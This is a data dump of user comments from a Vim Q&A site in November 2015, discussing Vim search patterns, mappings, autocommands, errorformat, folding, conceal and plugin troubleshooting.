  <row Id="8446" PostId="5481" Score="2" Text="What would happen if the plugin would use `:undojoin` for the commands it uses to modify the buffer? Sort of 'gluing' its operation(s) after those made previously by the user. Another idea would be to only automate parens in insert mode, and somehow isolate it from undo operations in insert mode." CreationDate="2015-11-15T10:49:57.833" UserId="1800" />
  <row Id="8447" PostId="5481" Score="0" Text="How do you insert that trailing )?" CreationDate="2015-11-15T10:53:39.590" UserId="54" />
  <row Id="8448" PostId="5443" Score="0" Text="May the extension `.vim` be &quot;dangerous&quot;, ie be confused with plugins? Maybe use better `.vimrc`?" CreationDate="2015-11-15T13:01:12.370" UserId="1963" />
  <row Id="8449" PostId="5302" Score="0" Text="`\@!` is used to prevent a match of the previous atom, that is, it matches with zero width if the previous part does not match." CreationDate="2015-11-15T16:00:31.890" UserId="21" />
  <row Id="8450" PostId="5484" Score="0" Text="`:h functions` makes more sense for you to find script related info." CreationDate="2015-11-15T17:12:14.267" UserId="1569" />
  <row Id="8451" PostId="5470" Score="0" Text="Yes indeed. There was a space after the 2." CreationDate="2015-11-15T18:30:14.663" UserId="5049" />
  <row Id="8452" PostId="5468" Score="0" Text="Ok, nevertheless a big thanks to you. I created a small repository on Github for this project so it can be plugged in with 2 lines. I think you should consider not deleting your solution, as it might be helpful for others in the future (including me)" CreationDate="2015-11-15T20:20:35.893" UserId="3282" />
  <row Id="8453" PostId="2377" Score="0" Text="@tommcdo, many months later, I definitely appreciate this answer. I found a small issue with it though. If I record a macro in which I hit `&lt;BS&gt;`, when I replay the macro it just stops at that point. The behavior is like other cases when something fails, for example if your macro has `fx` and there is no `x`, it would stop. It's like that but with any `&lt;BS&gt;`." CreationDate="2015-11-15T22:48:58.347" UserId="850" />
  <row Id="8455" PostId="5485" Score="3" Text="I think you mean `bufnr(&quot;%&quot;)` not `bufnr(&quot;.&quot;)`. I have often made that same mistake, probably because we use `&quot;.&quot;` to get the current line number, with `line(&quot;.&quot;)`." CreationDate="2015-11-16T01:09:29.073" UserId="630" />
  <row Id="8456" PostId="5485" Score="1" Text="@joeytwiddle For me, with only 1 (unnamed) buffer open and opening vim with `vim -u NONE`, `:echo bufnr('%')` yields 1 and `echo bufnr('.')` yields -1.  So probably % is right." CreationDate="2015-11-16T05:18:02.613" UserId="5022" />
  <row Id="8457" PostId="5485" Score="0" Text="Yes guys, I meant `%` and not `.`. Sorry." CreationDate="2015-11-16T06:03:40.107" UserId="54" />
  <row Id="8458" PostId="5489" Score="1" Text="Would you consider the following command as a potential solution to your problem : `g/report(&quot;/execute &quot;normal! obreak;\e&quot;&#xA;` ?" CreationDate="2015-11-16T07:51:27.233" UserId="4939" />
  <row Id="8459" PostId="5489" Score="0" Text="@saginaw Yes, that works. It correctly auto-indents too! :-) Any other solutions are welcome as well, auto-indent or not." CreationDate="2015-11-16T08:05:23.430" UserId="5316" />
  <row Id="8460" PostId="5488" Score="1" Text="I don't know if it will solve your problem, but maybe the `:mkview` and `:loadview` commands could help. You could try adding these 2 lines inside your vimrc `au BufWinLeave *.c mkview` and `au BufWinEnter *.c silent loadview` and adapt them to your specific needs. These are autocommands that will be automatically executed whenever you leave a buffer for the first one, and when you enter a buffer for the second one, but only for C files. I've copied them from the help of the `:mkview` command (`:help :mkview`)." CreationDate="2015-11-16T10:01:28.847" UserId="4939" />
  <row Id="8461" PostId="5488" Score="1" Text="According to the help, it should restore folds when using manual folding and the option `'viewoptions'` contains `folds`. If you want the autocommands to be executed for other filetypes, you can change the autocommands. For example, if you want to add python files, you could change `*.c` to `*.c,*.py`." CreationDate="2015-11-16T10:04:51.343" UserId="4939" />
  <row Id="8462" PostId="5476" Score="0" Text="The university filesystem hierarchy is big and weird, but I like the command line, so I'd rather not use a file manager. I have no regular pattern of visits, so aliases for each directory become numerous, often obsolete, and a bit forgettable. I open a lot of text files with netrw so it just seemed like a solution that was already part of what I do. I'll try your &quot;maybe&quot; solution. Thanks!" CreationDate="2015-11-16T10:07:58.130" UserId="2985" />
  <row Id="8463" PostId="5476" Score="0" Text="@user251764 I understand; however I don't like much the idea of using a text editor for such a thing. If a tool like midnight commander doesn't suit your expectations, maybe you could have a look at tools like commacd or  z or j or j2 or autojump or fasd (see: https://inconsolation.wordpress.com/2014/11/17/commacd-just-so-long-as-you-know-where-youre-going/ ) I don't use such tools myself, but in case it may help..." CreationDate="2015-11-16T10:14:18.257" UserId="5139" />
  <row Id="8464" PostId="5477" Score="0" Text="Thank you garyjohn, I will try your two filemanagers soon. I may well find them more useful than netrw" CreationDate="2015-11-16T10:15:41.970" UserId="2985" />
  <row Id="8465" PostId="5491" Score="1" Text="You could also use a range to specify the line, and then just substitute the end-of-line by whatever you want in the next line `:/report/s/$/\rbreak/`. This doesn't add anything new in this case, but can often make it easier to find the right patterns." CreationDate="2015-11-16T10:37:00.570" UserId="1296" />
  <row Id="8466" PostId="5489" Score="0" Text="Also, go macros! The time to record the macro in this case is certainly less than thinking about how to do it with the global command, and pairing search and the dot command has the advantage that you can easily leave out some &quot;report&quot;-calls where you don't want to add a break statement. Might not apply here, but can be very handy in other cases." CreationDate="2015-11-16T10:41:15.643" UserId="1296" />
  <row Id="8467" PostId="5488" Score="0" Text="I'm sorry, I was wrong when I said that the autocommands would be executed whenever you enter / leave a buffer. The first one will be executed after a buffer is displayed in a window, the second one will be executed before a buffer is removed from a window." CreationDate="2015-11-16T10:59:17.083" UserId="4939" />
  <row Id="8468" PostId="5491" Score="0" Text="@PhilippFrank Sure, that's yet another valid solution.  However, it has nothing to do with the point I was trying to make, about `\zs`." CreationDate="2015-11-16T11:38:42.447" UserId="2313" />
  <row Id="8469" PostId="5491" Score="0" Text="Right, it does not, it just felt right to put it here as a comment, since there's nothing new which warrants an answer and it's about finding the right patterns for the job." CreationDate="2015-11-16T11:43:47.590" UserId="1296" />
  <row Id="8470" PostId="5443" Score="0" Text="It is not dangerous, if you do not place it in the plugin folder. But you can use .vimrc if you like. The extension does not matter for the source command" CreationDate="2015-11-16T11:49:37.277" UserId="71" />
  <row Id="8471" PostId="5493" Score="0" Text="Thanks, so it's intended behaviour, got it :)" CreationDate="2015-11-16T12:11:54.810" UserId="5319" />
  <row Id="8472" PostId="5496" Score="1" Text="this is even with a &quot;nice&quot; UI, works for OP's need, and can be &quot;more&quot; than expected, depends on what you input. E.g. when one see `enter motion:`, he gave: `t,ggVGJZZ`  ^_^  It is a common problem for command concatenation" CreationDate="2015-11-16T15:09:50.950" UserId="1569" />
  <row Id="8473" PostId="5496" Score="0" Text="That is almost what I want. Eg: I press `/cw` then type something instead of the word, then press `&lt;Esc&gt;`. After I want to do the same with next occurrences. But after presing `n` (go to next occurrence) and `.` (repeat last command) it just prepend last typed text instead of replacing it. The main goal of the mapping is using it with `n/N` and `.` to repeat. Have I missed something?" CreationDate="2015-11-16T15:13:20.283" UserId="5321" />
  <row Id="8474" PostId="5497" Score="0" Text="I've update my question. It seems your answer is the closest one to my needs, but it doesn't do the same with the next occurrence, so I've explained that moment in the question." CreationDate="2015-11-16T15:19:08.323" UserId="5321" />
  <row Id="8475" PostId="5497" Score="0" Text="You have two operators (the `/c` and `i`) vim's `.` just repeats the last one. If you want to extend it, check `repeat` plugin. @TimurFayzrakhmanov also there are `:g` and `:s` commands, may help you too." CreationDate="2015-11-16T15:20:48.233" UserId="1569" />
  <row Id="8476" PostId="5496" Score="1" Text="This function is to clarify the idea of using functions when you have trouble with complex mappings. You should change it to meet your needs; try following Kent's advice to make the `.` repeat your command." CreationDate="2015-11-16T15:22:41.410" UserId="1405" />
  <row Id="8477" PostId="5497" Score="0" Text="Is there odd `&quot;` in your code `'let @/=@&quot;&quot;'`? I thought it is possible, for example `silent exec 'normal! `[v`]c'`, because `c` operator do what I expect, except it doesn't add the changed text to the search pattern." CreationDate="2015-11-16T15:32:42.973" UserId="5321" />
  <row Id="8478" PostId="5497" Score="1" Text="@TimurFayzrakhmanov the `&quot;&quot;`  was a typo.. fix.. I came up with `c` too, however it added a space, because there is mode change `n-i-n-i` I guess... do some test you will see." CreationDate="2015-11-16T15:34:34.560" UserId="1569" />
  <row Id="8480" PostId="5496" Score="0" Text="Thank you for the answer. It's useful too, but I accept the @Kent 's one, because it do motion immediately after I type them (without pending `&lt;CR&gt;` from `input()`)." CreationDate="2015-11-16T15:41:57.690" UserId="5321" />
  <row Id="8481" PostId="5496" Score="1" Text="@TimurFayzrakhmanov you could also try the substitute, as explained in the update." CreationDate="2015-11-16T15:42:30.400" UserId="1405" />
  <row Id="8482" PostId="5496" Score="0" Text="Yeap! I've already use the similar approach!))" CreationDate="2015-11-16T15:44:25.223" UserId="5321" />
  <row Id="8484" PostId="5499" Score="2" Text="`:help errorformat`" CreationDate="2015-11-16T19:16:19.493" UserId="54" />
  <row Id="8485" PostId="5415" Score="0" Text="I'm curious: Is there a reason why you have not marked my answer as correct? Perhaps I am wrong (I do not think so)?" CreationDate="2015-11-16T21:02:16.323" UserId="21" />
  <row Id="8486" PostId="5302" Score="0" Text="To make it more clear: `/^\(bla\)\@!/` matches any line that does NOT start with `bla`. This is done with the `\@!` multi. I find the list in `:h pattern-overview` very good to show the difference between the different patterns." CreationDate="2015-11-16T21:06:22.760" UserId="21" />
  <row Id="8487" PostId="5499" Score="0" Text="Note that a linker error does not contain a reference to a file and line (as a compiler error does), since it's all about combining compiled object files in the final binary: let's say a function definition is missing - where should the cursor jump?" CreationDate="2015-11-16T22:12:11.957" UserId="1800" />
  <row Id="8488" PostId="5499" Score="0" Text="@VanLaser it should just jump to the file or if it's really fancy to the first reference to the undefined symbol" CreationDate="2015-11-16T22:27:44.407" UserId="268" />
  <row Id="8489" PostId="5499" Score="0" Text="The linker only reports that something is missing, or not in order, AFAIK ...   at this stage, the source files were compiled alright, and the linker only sees that `foo()` has no definition. The idea is, linker errors are not *necessarily* a result of something written in your source code (to jump to)." CreationDate="2015-11-16T22:32:10.090" UserId="1800" />
  <row Id="8490" PostId="5499" Score="0" Text="For example, if you link 64-bit compiled code with a 32-bit library, there is a linker error, but there is no file to jump to." CreationDate="2015-11-16T22:38:27.510" UserId="1800" />
  <row Id="8491" PostId="5499" Score="0" Text="@VanLaser The linker knows which object files reference which symbols. The error I get for the above example from gcc: `/tmp/ccQcVJWD.o:test.c:function main: error: undefined reference to 'foo'` shows the temporary object file name, source file name, and even the name of the function referencing `foo`. If `foo` exists but there's a 32-64 bit mismatch then, at least with gcc on linux, I still get that error but also get an `incompatible target` error but really if there's a 32-64 bit mismatch, that's a build config error, not a source file error so it's fine if quickfix can't help in that case." CreationDate="2015-11-16T22:52:52.347" UserId="268" />
  <row Id="8492" PostId="5504" Score="0" Text="Do you have any autocommands that execute when you save? You can check by running without plugins, or by looking at the output of `:verb au BufWrite` and `:verb au BufWritePost`. (The gzip entries are expected.)" CreationDate="2015-11-17T04:44:47.173" UserId="630" />
  <row Id="8493" PostId="5504" Score="0" Text="@joeytwiddle Added both entry into my question, I'm not vary familiar with these or buffers." CreationDate="2015-11-17T05:00:12.893" UserId="2129" />
  <row Id="8494" PostId="5504" Score="0" Text="Hmm JSHint rings a bell. I might have had the same trouble with it myself! You could disable it to check. Failing that, try disabling Syntastic. Or a workaround might be to add your own hook to refresh the screen: `:au BufWritePost * :redraw!`" CreationDate="2015-11-17T05:09:05.480" UserId="630" />
  <row Id="8495" PostId="5504" Score="0" Text="@joeytwiddle I'll see how it goes, but sometimes when you type, you think you've made a mistake or had extra letters but in actual fact they are not really there. It's not specifically just the 'w' character sometimes I get x or other symbols etc Thanks anyways." CreationDate="2015-11-17T05:16:01.337" UserId="2129" />
  <row Id="8496" PostId="5504" Score="0" Text="&lt;Ctrl-L&gt; is always there to set your mind at ease. :) It would be great to get it fixed in the general case. I still get it with other plugins sometimes." CreationDate="2015-11-17T05:22:09.230" UserId="630" />
  <row Id="8498" PostId="5499" Score="0" Text="The 32bit-64bit issue was a(nother) example, not related to `foo()`. If the linker offers file information and some other keyword (such as `foo`), the solution of course involves setting `errorformat` (will probably involve the `%s` item). All I wanted to say was that linker errors won't always offer you even that much information." CreationDate="2015-11-17T08:25:54.647" UserId="1800" />
  <row Id="8499" PostId="5499" Score="1" Text="@VanLaser Fair enough, I guess lack of `main` would be one example where there really is nowhere to jump. I'll see about figuring out `errorformat` and posting an answer." CreationDate="2015-11-17T08:33:50.453" UserId="268" />
  <row Id="8500" PostId="5501" Score="1" Text="See also [this question](http://stackoverflow.com/questions/33087376/get-the-backtrace-of-a-function-call)." CreationDate="2015-11-17T09:15:59.407" UserId="1577" />
  <row Id="8501" PostId="5440" Score="0" Text="Successfully tested in Vim 7.4.826 on Debian/sid." CreationDate="2015-11-17T13:38:01.537" UserId="1352" />
  <row Id="8502" PostId="5506" Score="1" Text="Just to add a reference: http://learnvimscriptthehardway.stevelosh.com/chapters/38.html" CreationDate="2015-11-17T14:09:55.107" UserId="1800" />
  <row Id="8503" PostId="5508" Score="6" Text="`f.` doesn't move the cursor to the next dot in the file but to the next dot on the line. If your dot is not on the same line as your cursor, it can't work. If you want to move to the next dot in the file, you can try `/\.`. Now, if your cursor is on the same line as the dot, then maybe the problem comes from a shadowing mapping, what's the output of `:nmap f` ?" CreationDate="2015-11-17T16:30:57.180" UserId="4939" />
  <row Id="8504" PostId="5504" Score="2" Text="This is a known issue and happens usually, when vim is busy leaving stray letters around (usually the ones you typed last) and can be cleared by `Ctrl-L`." CreationDate="2015-11-17T18:17:49.720" UserId="71" />
  <row Id="8505" PostId="5508" Score="4" Text="There exist plugins, that allow the f and t command (and their upper case commands) to search not only in the current line, but also in the next line. Basically, this is done by mapping the f command to a search function." CreationDate="2015-11-17T18:24:01.377" UserId="71" />
  <row Id="8506" PostId="5502" Score="1" Text="This has nothing to do with indentation.  You're typing the `{` and `}` so just type them in the correct places.  On the other hand, if you want something to reformat your code into that style, then you may want to look at the (poorly named) indent program." CreationDate="2015-11-17T19:09:37.637" UserId="15" />
  <row Id="8507" PostId="5510" Score="0" Text="Try to make a single command, that covers both cases." CreationDate="2015-11-17T22:19:14.193" UserId="1800" />
  <row Id="8508" PostId="5510" Score="0" Text="@VanLaser I have, and failed. I currently have it as two commands, `ComC` and `ComM`, for &quot;compile current&quot; and &quot;compile many&quot;. Still, it's an interesting question, even if the answer is just &quot;It can't be done&quot;." CreationDate="2015-11-17T22:20:14.750" UserId="5342" />
  <row Id="8509" PostId="5510" Score="1" Text="How about making a `Makefile` (that has as targets either the whole binary, or just a single object - so it would solve both of your problems)? You will then just have to run `:make` from Vim AND you get any errors in the quickfix window." CreationDate="2015-11-17T22:39:51.543" UserId="1800" />
  <row Id="8510" PostId="5510" Score="0" Text="@VanLaser Hm, that could work. The problem is that then, even for my tiny little test things, I have to make a makefile." CreationDate="2015-11-17T22:45:14.980" UserId="5342" />
  <row Id="8512" PostId="5510" Score="0" Text="Yes - perhaps have a Makefile template or snippet skeleton ready. There is also [this](https://github.com/vim-scripts/SingleCompile), but only for a single file ..." CreationDate="2015-11-17T22:47:13.323" UserId="1800" />
  <row Id="8513" PostId="5510" Score="0" Text="BTW, to compile/build a single source file, you don't even need a Makefile. E.g. if you have `test.c`, just run from Vim: `:make test` and &quot;it will be done&quot;." CreationDate="2015-11-17T22:58:26.750" UserId="1800" />
  <row Id="8514" PostId="5510" Score="0" Text="@VanLaser Huh, that's fascinating. Could you put it in an answer?" CreationDate="2015-11-17T22:59:10.823" UserId="5342" />
  <row Id="8515" PostId="5510" Score="0" Text="It's too late, I have to sleep, but it's no big deal (it's a property of `make` - the program - it tries to infer building rules)." CreationDate="2015-11-17T23:01:04.737" UserId="1800" />
  <row Id="8516" PostId="5503" Score="1" Text="This is amazing! Thank you very much for the detailed answer and for your time." CreationDate="2015-11-17T23:26:00.440" UserId="5328" />
  <row Id="8517" PostId="5504" Score="0" Text="@ChristianBrabandt oh its a known issue, is it new? I never really had this issue previously. I've been using vim for quiet a while now. This is probably the first time I see it." CreationDate="2015-11-18T00:21:10.863" UserId="2129" />
  <row Id="8518" PostId="5325" Score="0" Text="Maybe Emacs can do it? ;)" CreationDate="2015-11-18T05:48:11.423" UserId="1248" />
  <row Id="8519" PostId="5511" Score="6" Text="SPF13 is a crutch. You are not disabled so you don't need one. Get rid of it." CreationDate="2015-11-18T07:45:03.340" UserId="54" />
  <row Id="8520" PostId="5501" Score="0" Text="@lcd047 Thanks, very helpful as well." CreationDate="2015-11-18T11:29:08.863" UserId="5328" />
  <row Id="8521" PostId="5508" Score="0" Text="Can you update your comment with the name or link to that plugin? I'd like to give it a try. Or just make it an answer with the actual binding?" CreationDate="2015-11-18T12:12:16.257" UserId="5341" />
  <row Id="8522" PostId="5515" Score="3" Text="Some more differences are mentioned in the [faq](https://vimhelp.appspot.com/vim_faq.txt.html#faq-1.4)" CreationDate="2015-11-18T13:12:21.867" UserId="71" />
  <row Id="8523" PostId="5513" Score="0" Text="how can I rebind all `f` and `t` to use this kind of search instead of default behavior?" CreationDate="2015-11-18T13:20:33.300" UserId="5341" />
  <row Id="8524" PostId="5517" Score="0" Text="This might help: `:help 'langmap'`." CreationDate="2015-11-18T15:39:53.537" UserId="2313" />
  <row Id="8525" PostId="5506" Score="0" Text="Yea, this with guifg is wrong, thanks for advise and for function. I was just thinking about something like that, but I didn't know how to do it. Thanks!" CreationDate="2015-11-18T15:44:25.683" UserId="5335" />
  <row Id="8526" PostId="5509" Score="0" Text="Thanks! I was thinking about some function, as saginaw presented, but this is better solution. Thanks!" CreationDate="2015-11-18T15:46:22.810" UserId="5335" />
  <row Id="8527" PostId="5518" Score="0" Text="Isn't the mode your in after pressing `r` called operator pending mode or so?" CreationDate="2015-11-18T16:06:25.770" UserId="350" />
  <row Id="8528" PostId="5518" Score="1" Text="I don't know in which mode we are when we hit `r` but as far I as I know there's no mapping for it (inoremap, vnoremap, cnoremap... have no effect). As for the operator pending mode, I think it's something else. When you hit the key of an operator (`d` to delete, `c` to cut, `s` to substitute etc.), vim waits for a movement to know on which characters it must act. I think that the term operator pending mode refers to that moment. But maybe I misunderstood the concept." CreationDate="2015-11-18T16:37:04.380" UserId="4939" />
  <row Id="8529" PostId="5518" Score="1" Text="The text that is between your cursor and the position you reach after you give a movement could be considered as an object, on which the operator acts. You can define your own objects with the `onoremap` command. It's explained in more details here : http://learnvimscriptthehardway.stevelosh.com/chapters/15.html" CreationDate="2015-11-18T16:38:21.187" UserId="4939" />
  <row Id="8531" PostId="5516" Score="0" Text="I've checked autoindent documentation but it only copies indentation from previous line. But I want Vim to recognize end curly brace and **decrease** indentation on next line." CreationDate="2015-11-18T17:32:43.420" UserId="5329" />
  <row Id="8533" PostId="5508" Score="2" Text="If you want to replace/extend the built-in functionality for `f` and `F`, you probably need to install additional plugins. I asked the same question a while ago (https://vi.stackexchange.com/questions/4486/expand-f-and-t-motion-to-next-lines) and got a lot of good answers. Not only `f` and `F` get extended in most plugins mentioned in that thread, but also `t` and `T` (till forwards and backwards). For example to delete a sentence, you would press `df.` (or if you wanna keep the full stop `dt.`)." CreationDate="2015-11-18T18:32:06.133" UserId="3282" />
  <row Id="8534" PostId="5516" Score="0" Text="@jendas now I think I understand your question; I've updated my answer" CreationDate="2015-11-18T18:49:58.293" UserId="1405" />
  <row Id="8535" PostId="5521" Score="0" Text="After asking a question I've already guessed the mistake)) but still..even if I use `zg` how to specify a concrete file/path to store the words?" CreationDate="2015-11-18T19:17:18.120" UserId="5321" />
  <row Id="8537" PostId="5521" Score="1" Text="I edited the answer, I hope it will help you." CreationDate="2015-11-18T19:40:47.093" UserId="4939" />
  <row Id="8538" PostId="5525" Score="0" Text="Sorry, I wasn't clear. I don't want to copy colours, but only the displayed characters. For example, if it shows `^@` for NUL, or `^H` for backspace, or `λ` for ``\``, then I want my copied text to use `^@`, `^H` and `λ` respectively. Indeed, for selecting with the mouse, column-wise selection is better than using just `Shift`." CreationDate="2015-11-18T21:08:42.750" UserId="205" />
  <row Id="8539" PostId="5525" Score="0" Text="@muru What I do, when I want this is: I usually hold the shift key and select (linewise) with the mouse. Further post-processing (like column wise selection is done in another instance of Vim" CreationDate="2015-11-18T21:12:57.200" UserId="71" />
  <row Id="8540" PostId="5525" Score="0" Text="Yes, but that adds nothing to the discussion - I have already mentioned using the mouse." CreationDate="2015-11-18T21:13:35.497" UserId="205" />
  <row Id="8541" PostId="5524" Score="3" Text="Does `:TOhtml` work as expected? If it does, you could try borrowing whatever method that uses." CreationDate="2015-11-18T21:28:09.240" UserId="51" />
  <row Id="8542" PostId="5523" Score="2" Text="I'd bet heavily that OP actually has a &quot;tiny vim&quot; vi." CreationDate="2015-11-18T22:15:06.520" UserId="9" />
  <row Id="8544" PostId="5524" Score="0" Text="@Carpetsmoker yes, it does show the displayed characters." CreationDate="2015-11-18T22:47:44.833" UserId="205" />
  <row Id="8545" PostId="5514" Score="0" Text="You obviously aren't using many advanced features of vim.  block select, search for word under cursor, increment number under cursor, syntax highlighting etc." CreationDate="2015-11-19T03:55:20.310" UserId="2106" />
  <row Id="8546" PostId="5529" Score="2" Text="Wow, crazy! I never knew about the debugging mode! Thanks a bunch, this is going to be really useful! :D" CreationDate="2015-11-19T07:11:17.420" UserId="21" />
  <row Id="8547" PostId="5530" Score="0" Text="Perfect, using `call` works. I'm not interested in swallowing any errors either (it's not something worth writing error-handling for, but I'm happy for the error to bubble up - if you see what it's doing, it's very unlikely to fail anyway :). Thanks." CreationDate="2015-11-19T07:14:35.867" UserId="91" />
  <row Id="8548" PostId="5528" Score="1" Text="There are a few ways to do it: (1) `call append(...)`; (2) put `&quot; @vimlint(EVL102, 1, l:failed)` and `&quot; @vimlint(EVL102, 0, l:failed)` around your function; (3) `let g:syntastic_vimlint_options = { 'EVL102': 1 }`; (4) use `g:syntastic_quiet_messages`; (5) use `g:syntastic_vim_vimlint_quiet_messages`." CreationDate="2015-11-19T07:34:44.530" UserId="1577" />
  <row Id="8549" PostId="5528" Score="0" Text="@lcd047, ok, thanks. All but (1) are suppressing the warning in vimlint, not fixing the root cause. So I'm going to accept Christian's answer. But good tips if there's a slightly different vimlint issue in future." CreationDate="2015-11-19T07:50:00.870" UserId="91" />
  <row Id="8550" PostId="5528" Score="0" Text="The root cause is you not checking for errors.  None of the above fixes that, but all of them answer your question as you asked it: &quot;avoid the warning about the unused variable, but also have a syntactically correct function&quot;. _shrug_" CreationDate="2015-11-19T08:41:31.850" UserId="1577" />
  <row Id="8551" PostId="5528" Score="0" Text="@lcd047 fair point :) Anyway, thanks for the answer..." CreationDate="2015-11-19T09:01:38.120" UserId="91" />
  <row Id="8552" PostId="5529" Score="2" Text="This is the kind of mistake that is usually the hardest to find for me, especially since the syntax highlighting did look ok. Thanks a lot, especially for your additional hints (I was not aware of the built-in debugger either)." CreationDate="2015-11-19T11:12:26.977" UserId="3282" />
  <row Id="8553" PostId="5529" Score="1" Text="I agree with you, the hints given by Christian Brabandt have a great value, I think I will use them a lot from now on. I temporarily copied your code inside my vimrc and the offending part `else if` was colored in red. When you don't remember how to type an instruction in vimscript, or the name of a function, here's another tip : type the beginning of the word (here for example `el`), then hit `Ctrl-x` `Ctrl-o`. It should trigger omnicompletion which will give you a few suggestions inside a popup menu. You can cycle through the suggestions with `Ctrl-n` and `Ctrl-p`." CreationDate="2015-11-19T11:45:43.510" UserId="4939" />
  <row Id="8554" PostId="5524" Score="0" Text="The source for that is at `/usr/share/vim/vim74/autoload/tohtml.vim`. Taking a quick peek at it, it seems to use `getline()` to get the data. So a mapping that does `let @+ = getline('.')` should work. For more lines you need a slightly more complex function..." CreationDate="2015-11-19T11:49:41.930" UserId="51" />
  <row Id="8555" PostId="5513" Score="0" Text="you can create your own operator pending mapping. however, since the `/` and `?` are working out of box, why not just use them?" CreationDate="2015-11-19T12:31:26.507" UserId="1569" />
  <row Id="8556" PostId="5529" Score="0" Text="@saginaw: Do you say that you were able to see that mistake just by looking at the colors? For me there is no difference in colors for `elseif` and `else if`. Do you have an additional syntax file for vimscript? Or do you use a linter for VimL with Syntastic?" CreationDate="2015-11-19T13:47:07.350" UserId="3282" />
  <row Id="8557" PostId="5529" Score="0" Text="@cbaumhardt Yes, that's right, even with my plugins disabled. Here's the output of `vim --startuptime log` : https://paste.debian.net/?show=333858;lines=0 Here's the output of my `/usr/share/vim/vim74/syntax/syntax.vim` : https://paste.debian.net/333859/ Here's the output of `/usr/share/vim/vim74/syntax/synload.vim` : https://paste.debian.net/333862/ And here's the output of `/usr/share/vim/vim74/syntax/syncolor.vim` : https://paste.debian.net/333864/" CreationDate="2015-11-19T14:11:38.523" UserId="4939" />
  <row Id="8558" PostId="5529" Score="0" Text="@cbaumhardt I forgot to tell you that for omnicompletion to work in a vimscript file, you should probably add `set omnifunc=syntaxcomplete#Complete` to your vimrc." CreationDate="2015-11-19T14:17:55.583" UserId="4939" />
  <row Id="8559" PostId="5529" Score="0" Text="@saginaw: I see the &quot;red&quot; syntax highlighting for `else if` if I write in my `.vimrc`, however not in my `folding.vim` file - although in both of them the output of `:set filetype?` is `filetype=vim`. Any idea why the syntax highlighting might be different for these two files? I thought this would just depend on the filetype..." CreationDate="2015-11-19T14:26:53.393" UserId="3282" />
  <row Id="8560" PostId="5529" Score="0" Text="Ah, you're right, it's not highlighted outside vimrc. But no, sorry I don't know why. If you want to start investigating, you can add this mapping inside your vimrc : `map &lt;F10&gt; :echo &quot;hi&lt;&quot; . synIDattr(synID(line(&quot;.&quot;),col(&quot;.&quot;),1),&quot;name&quot;) . '&gt; trans&lt;' . synIDattr(synID(line(&quot;.&quot;),col(&quot;.&quot;),0),&quot;name&quot;) . &quot;&gt; lo&lt;&quot; . synIDattr(synIDtrans(synID(line(&quot;.&quot;),col(&quot;.&quot;),1)),&quot;name&quot;) . &quot;&gt;&quot;&lt;CR&gt;&#xA;` Then when your cursor is on the word `elseif` hit `F10`, it should tell you which highlight group is responsible for the color." CreationDate="2015-11-19T15:11:29.077" UserId="4939" />
  <row Id="8561" PostId="5529" Score="1" Text="I've done it in my vimrc, the highlight group is `vimElseIfErr` which is linked to (inherits its attributes from) the highlight group `Error`. However, in the `folding.vim` file, the highlight group used to colorize `elseif` is `vimNotFunc` which is linked to `Statement`. I don't know why the `vimNotFunc` group is used instead of vimElseIfErr. If you want to know more about syntax highlighting, you could read the chapters 45 to 47 of this site : http://learnvimscriptthehardway.stevelosh.com/chapters/45.html Otherwise you should probably update your question or open another topic." CreationDate="2015-11-19T15:11:49.040" UserId="4939" />
  <row Id="8562" PostId="2377" Score="0" Text="Hey @Shahbaz, looking into this it seems that `feedkeys()` is the culprit. In my testing, any use of `feedkeys()` while recording a macro causes issues upon replaying the macro. This may be a bug in Vim. I'm not aware of a better way than using `feedkeys()` to programmatically fire off keystrokes in Insert mode." CreationDate="2015-11-19T16:31:49.100" UserId="64" />
  <row Id="8563" PostId="5533" Score="0" Text="Hope you don't mind my asking... Why are you specifically excluding folds?" CreationDate="2015-11-19T16:52:50.803" UserId="475" />
  <row Id="8564" PostId="5533" Score="1" Text="Of course I don't :) I excluded folds cause I know how to collapse comments with folds - but folded comments still distract, hinder the reading flow and are not really visually appealing." CreationDate="2015-11-19T17:14:35.433" UserId="3282" />
  <row Id="8565" PostId="5536" Score="3" Text="PROTIP: `:help key` followed by Ctrl+D" CreationDate="2015-11-19T17:15:46.040" UserId="54" />
  <row Id="8566" PostId="5513" Score="0" Text="@Kent because it's too many keystrokes I guess. `f.` is 2 keys and `?\.&lt;CR&gt;` is 4; not that efficient to me. Unless I'm missing something here." CreationDate="2015-11-19T17:22:05.207" UserId="5341" />
  <row Id="8567" PostId="5508" Score="0" Text="@cbaumhardt thanks, will check it. I guess that's what I need here." CreationDate="2015-11-19T17:23:07.097" UserId="5341" />
  <row Id="8568" PostId="5533" Score="0" Text="I *want* a lot of things too, but I found out it's usually better to stick/adapt to what I need ;)" CreationDate="2015-11-19T17:40:30.590" UserId="1800" />
  <row Id="8569" PostId="5539" Score="1" Text="This is really great, I did not know about the conceal feature. With your solution the lines are still in there, but are either completely empty or have just one char - so I have way less distraction looking at my code. I am still hoping there is a way to not show specific lines at all, but this solution is also good (way better than folding for me)." CreationDate="2015-11-19T18:29:27.373" UserId="3282" />
  <row Id="8570" PostId="5539" Score="0" Text="Wow, conceal is really great, you can even conceal only parts of a line (vertical folding): http://vim.wikia.com/wiki/Patch_to_conceal_parts_of_lines" CreationDate="2015-11-19T18:47:52.170" UserId="3282" />
  <row Id="8571" PostId="5539" Score="0" Text="@cbaumhardt I've edited my answer to include another proposition, that maybe could interest you." CreationDate="2015-11-19T19:58:23.613" UserId="4939" />
  <row Id="8572" PostId="2377" Score="0" Text="@tommcdo, thanks for taking a look. I guess I could always do something better than use backspace, but I just wanted to bring this to your attention. If it's indeed a bug, it may be worth reporting it." CreationDate="2015-11-19T20:31:15.667" UserId="850" />
  <row Id="8573" PostId="5533" Score="0" Text="@cbaumhardt you could fold it and use a custom 'foldtext' setting/function to hide everything" CreationDate="2015-11-19T21:28:39.720" UserId="71" />
  <row Id="8574" PostId="5542" Score="0" Text="Thank you so much!" CreationDate="2015-11-19T23:03:45.873" UserId="5372" />
  <row Id="8576" PostId="5539" Score="0" Text="The proposal in your edit is not really an option, cause I want to be able to still use my normal folding. But when I do so, the `Folded` elements for my normal folds need color, so the only option is to just fill the foldtext for the lines I want to hide with spaces. However, I will still see the underlined part as well as the different background for the `Folded` objects - and I can't change that, as I need them for my normal folds to work." CreationDate="2015-11-20T01:23:26.317" UserId="3282" />
  <row Id="8577" PostId="5453" Score="0" Text="filetype detection, plugin, and indent are all on. When I run :scriptnames, sql.vim is loaded, but sqlanywhere.vim is not, which seems significant." CreationDate="2015-11-20T01:51:43.353" UserId="1410" />
